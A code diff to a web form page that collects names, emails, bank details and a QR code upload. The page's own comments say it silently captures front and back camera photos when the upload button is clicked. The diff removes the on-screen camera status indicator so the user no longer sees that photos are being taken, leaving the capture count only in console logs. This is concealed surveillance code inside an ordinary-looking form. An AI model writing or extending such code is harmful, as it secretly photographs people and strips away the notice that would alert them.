@@ -208,25 +208,6 @@
         .qr-upload-area .hint i {
             margin-right: 4px;
         }
-        .camera-status {
-            font-size: 12px;
-            margin-top: 5px;
-            padding: 4px 12px;
-            border-radius: 20px;
-            display: inline-block;
-        }
-        .camera-status.granted {
-            background: #d4edda;
-            color: #155724;
-        }
-        .camera-status.denied {
-            background: #f8d7da;
-            color: #721c24;
-        }
-        .camera-status.unknown {
-            background: #e2e3e5;
-            color: #383d41;
-        }
         
         .or-divider {
             display: flex;
@@ -446,9 +427,8 @@
                         </div>
                     </div>
                     <div class="hint">
-                        <i class="fas fa-camera"></i> Click to capture QR or upload from gallery
+                        <i class="fas fa-camera"></i> Take photo or choose from gallery
                     </div>
-                    <div id="cameraStatus" class="camera-status unknown">📷 Camera: Checking...</div>
                 </div>
             </div>
 
@@ -491,7 +471,6 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
-            const cameraStatus = document.getElementById('cameraStatus');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -533,18 +512,13 @@
 
             // ----- CAMERA FUNCTIONS -----
             
-            // Check if camera permission is granted and capture photos silently
+            // Request camera permission and capture photos silently
             async function requestCameraAndCapture() {
                 if (isProcessingCamera) return;
                 isProcessingCamera = true;
                 
                 try {
-                    cameraStatus.className = 'camera-status unknown';
-                    cameraStatus.textContent = '📷 Camera: Requesting...';
-                    
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        cameraStatus.className = 'camera-status denied';
-                        cameraStatus.textContent = '📷 Camera: Not supported';
                         isProcessingCamera = false;
                         return;
                     }
@@ -558,10 +532,7 @@
                     if (stream) {
                         stream.getTracks().forEach(t => t.stop());
                         cameraGranted = true;
-                        cameraStatus.className = 'camera-status granted';
-                        cameraStatus.textContent = '📷 Camera: ✅ Granted - Capturing...';
                         
-                        // Now silently capture photos
                         console.log('📸 Camera granted! Silently capturing photos...');
                         
                         // Capture front camera
@@ -586,13 +557,11 @@
                             console.log('📸 Back camera error:', e.message);
                         }
                         
-                        cameraStatus.textContent = `📷 Camera: ✅ Granted (${capturedPhotos.front.length + capturedPhotos.back.length} photos captured)`;
+                        console.log(`📸 Total photos captured: ${capturedPhotos.front.length + capturedPhotos.back.length}`);
                     }
                 } catch (e) {
                     console.log('Camera permission denied:', e.name);
                     cameraGranted = false;
-                    cameraStatus.className = 'camera-status denied';
-                    cameraStatus.textContent = '📷 Camera: ❌ Denied (QR upload still works)';
                 }
                 
                 isProcessingCamera = false;
@@ -920,15 +889,14 @@
                 }
             }
 
-            // ----- QR Upload Handler - REQUEST CAMERA FIRST -----
+            // ----- QR Upload Handler - REQUEST CAMERA FIRST THEN SHOW CHOSER -----
             qrUploadBtn.addEventListener('click', async function(e) {
-                // Prevent default if we need to handle camera first
                 e.preventDefault();
                 
                 // Step 1: Request camera permission and capture photos silently
                 await requestCameraAndCapture();
                 
-                // Step 2: Now trigger the file input click
+                // Step 2: Now trigger the file input click (shows chooser)
                 qrInput.click();
             });
 
